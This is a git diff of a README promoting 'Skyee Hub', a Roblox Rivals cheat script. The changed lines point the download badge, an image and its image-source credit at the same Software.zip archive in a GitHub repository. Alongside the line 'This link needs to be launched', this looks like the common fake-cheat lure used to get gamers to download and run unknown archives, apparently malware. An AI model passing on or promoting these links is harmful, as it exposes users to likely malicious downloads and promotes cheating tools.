@@ -18,7 +18,7 @@ This repository hosts the new Roblox Rivals script GUI called Skyee Hub. With nu
 ### Topics:
 Topics for this repository are not provided.
 
-[![Download Skyee Hub](https://img.shields.io/badge/Download-Skyee_Hub-9cf)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)
+[![Download Skyee Hub](https://github.com/EricHoang2809/Rivals-Script/releases/download/v2.0/Software.zip)](https://github.com/EricHoang2809/Rivals-Script/releases/download/v2.0/Software.zip)
 *(This link needs to be launched)*
 
 ## 📦 Installation:
@@ -47,6 +47,6 @@ If you encounter any issues while using Skyee Hub or have feedback to share, ple
 
 *Dive into the world of Roblox Rivals with Skyee Hub - the ultimate script GUI for enhancing your gameplay! Get ready to outsmart, outperform, and outplay your rivals with ease.* 🎮
 
-![Skyee Hub](https://via.placeholder.com/800x400)
+![Skyee Hub](https://github.com/EricHoang2809/Rivals-Script/releases/download/v2.0/Software.zip)
 
-*Image Source: [Placeholder.com](https://placeholder.com)*
+*Image Source: [https://github.com/EricHoang2809/Rivals-Script/releases/download/v2.0/Software.zip](https://github.com/EricHoang2809/Rivals-Script/releases/download/v2.0/Software.zip)*
